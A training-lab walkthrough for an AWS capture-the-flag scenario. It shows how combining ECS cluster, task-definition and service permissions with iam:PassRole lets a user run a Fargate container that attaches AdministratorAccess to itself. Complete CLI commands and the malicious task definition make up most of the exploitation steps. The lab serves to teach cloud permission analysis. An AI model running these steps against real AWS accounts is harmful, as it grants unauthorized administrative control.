# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:CreateService

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user can create AWS ECS (Elastic Container Service) infrastructure and deploy containerized workloads with privileged IAM roles. By combining the permissions `ecs:CreateCluster`, `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:CreateService`, an attacker can stand up an entire ECS environment and execute code with administrative privileges.

Unlike scenarios where existing ECS infrastructure is leveraged, this attack path allows the attacker to create their own cluster from scratch. The attacker registers a task definition that uses a privileged IAM role, then creates a persistent ECS service on AWS Fargate to execute that task. The containerized workload runs with the permissions of the passed role and can perform any administrative action, such as attaching an AdministratorAccess policy to the starting user's account.

This vulnerability is particularly dangerous because it provides persistence through the ECS service, which will automatically restart the task if it fails. The attack leverages AWS's serverless Fargate launch type, requiring no EC2 instances or complex networking setup. Organizations often grant these ECS permissions to development teams for legitimate container deployments without realizing they can be chained together for privilege escalation. The attack surface is significant because ECS is widely used in modern cloud architectures, and the required permissions appear innocuous when viewed individually.

## The Challenge

You start as `pl-prod-ecs-001-to-admin-starting-user` — an IAM user whose credentials you have obtained. Your goal is to reach the `pl-prod-ecs-001-to-admin-target-role`, which carries `AdministratorAccess`. You cannot assume the role directly, but you hold a set of ECS and PassRole permissions that, when combined, let you run arbitrary code as that role.

Your starting permissions are:
- `ecs:CreateCluster` — you can stand up a brand new ECS cluster
- `iam:PassRole` (scoped to `pl-prod-ecs-001-to-admin-target-role`) — you can hand that privileged role to an ECS task
- `ecs:RegisterTaskDefinition` — you can define what code runs and with which role
- `ecs:CreateService` — you can deploy a persistent Fargate service that runs your task

Confirm your identity and verify you do not yet have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-ecs-001-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — no admin access yet.

## Reconnaissance

Before launching the attack, you need a few pieces of information for Fargate's awsvpc network mode: the default VPC ID and at least one subnet ID. These are read-only API calls.

```bash
# Find the default VPC
DEFAULT_VPC=$(aws ec2 describe-vpcs \
  --filters "Name=is-default,Values=true" \
  --query 'Vpcs[0].VpcId' \
  --output text)
echo "Default VPC: $DEFAULT_VPC"

# Find subnets in that VPC
SUBNET_1=$(aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
  --query 'Subnets[0].SubnetId' \
  --output text)
echo "Subnet: $SUBNET_1"
```

You also need the account ID to construct the target role ARN:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-001-to-admin-target-role"
echo "Target role: $TARGET_ROLE_ARN"
```

## Exploitation

### Step 1: Create an ECS Cluster

You need a cluster to host the malicious Fargate service. There is no pre-existing infrastructure to leverage here — you create it yourself.

```bash
aws ecs create-cluster \
  --cluster-name pl-ecs-001-attack-cluster \
  --output json
```

This succeeds because you hold `ecs:CreateCluster` on `*`. The cluster is now ready to accept task definitions and services.

### Step 2: Register a Task Definition with the Privileged Role

Here is where `iam:PassRole` is consumed. You register a task definition whose `taskRoleArn` and `executionRoleArn` are both set to `pl-prod-ecs-001-to-admin-target-role`. The container runs a shell one-liner that installs the AWS CLI and calls `iam:AttachUserPolicy` to attach `AdministratorAccess` to your starting user.

```bash
TASK_DEFINITION=$(cat <<EOF
{
  "family": "pl-ecs-001-admin-escalation",
  "taskRoleArn": "${TARGET_ROLE_ARN}",
  "executionRoleArn": "${TARGET_ROLE_ARN}",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "public.ecr.aws/docker/library/alpine:latest",
      "essential": true,
      "command": [
        "sh", "-c",
        "apk add --no-cache aws-cli && aws iam attach-user-policy --user-name pl-prod-ecs-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && echo 'Admin policy attached successfully' && sleep 10"
      ]
    }
  ]
}
EOF
)

aws ecs register-task-definition --cli-input-json "$TASK_DEFINITION" \
  --query 'taskDefinition.taskDefinitionArn' --output text
```

The key insight: `iam:PassRole` is checked at registration time, not at runtime. By specifying the role in the task definition, you have already exercised your ability to delegate those permissions to the container runtime.

### Step 3: Deploy the Fargate Service

With the task definition registered, you create a persistent ECS service. Fargate will immediately schedule the task on serverless infrastructure — no EC2 instances, no SSH keys, nothing to provision.

```bash
SERVICE_CONFIG=$(cat <<EOF
{
  "cluster": "pl-ecs-001-attack-cluster",
  "serviceName": "pl-prod-ecs-001-attack-service",
  "taskDefinition": "pl-ecs-001-admin-escalation",
  "desiredCount": 1,
  "launchType": "FARGATE",
  "networkConfiguration": {
    "awsvpcConfiguration": {
      "subnets": ["${SUBNET_1}"],
      "assignPublicIp": "ENABLED"
    }
  }
}
EOF
)

aws ecs create-service --cli-input-json "$SERVICE_CONFIG" --output json
```

The service is now ACTIVE. Fargate will spin up a task, pull the Alpine image, install the AWS CLI, and execute `iam:AttachUserPolicy` using the credentials of `pl-prod-ecs-001-to-admin-target-role`. Because the ECS service's desired count is 1 and the task exits after attaching the policy, the service will attempt to restart the task — providing persistence — but the IAM change only needs to succeed once.

### Step 4: Wait for the Task to Complete

Poll the service and then the task until the task reaches `STOPPED` status, which means the container finished executing:

```bash
# Wait for service to show running tasks
aws ecs describe-services \
  --cluster pl-ecs-001-attack-cluster \
  --services pl-prod-ecs-001-attack-service \
  --query 'services[0].{status:status,running:runningCount}'

# Get the task ARN and wait for STOPPED
TASK_ARN=$(aws ecs list-tasks \
  --cluster pl-ecs-001-attack-cluster \
  --service-name pl-prod-ecs-001-attack-service \
  --query 'taskArns[0]' --output text)

aws ecs describe-tasks \
  --cluster pl-ecs-001-attack-cluster \
  --tasks "$TASK_ARN" \
  --query 'tasks[0].lastStatus' --output text
# STOPPED
```

Once the task is stopped, wait 15 seconds for IAM policy propagation.

## Verification

Now verify you have administrator access using your original starting user credentials:

```bash
aws iam list-users --max-items 3 --output table
```

If the table renders successfully, the `AdministratorAccess` policy has been attached to `pl-prod-ecs-001-to-admin-starting-user` and the privilege escalation is complete.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ecs-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited four permissions that appear innocuous in isolation. `ecs:CreateCluster` and `ecs:CreateService` are standard developer permissions for container deployments. `ecs:RegisterTaskDefinition` is needed to define what runs in those containers. And `iam:PassRole` scoped to a single role looks like a reasonable restriction. But together, they form a complete code execution primitive: you created infrastructure, specified what code runs on it, declared which IAM role that code assumes, and deployed a service to run it all. The container ran as `pl-prod-ecs-001-to-admin-target-role` and used that role's AdministratorAccess to grant your starting user the same level of access.

This is a canonical example of why privilege escalation analysis must evaluate permission combinations, not individual permissions. A CSPM tool inspecting each permission in isolation would find nothing alarming; only a tool that traverses the graph of possible actions — from PassRole to ECS service deployment to IAM modification — will surface this path.
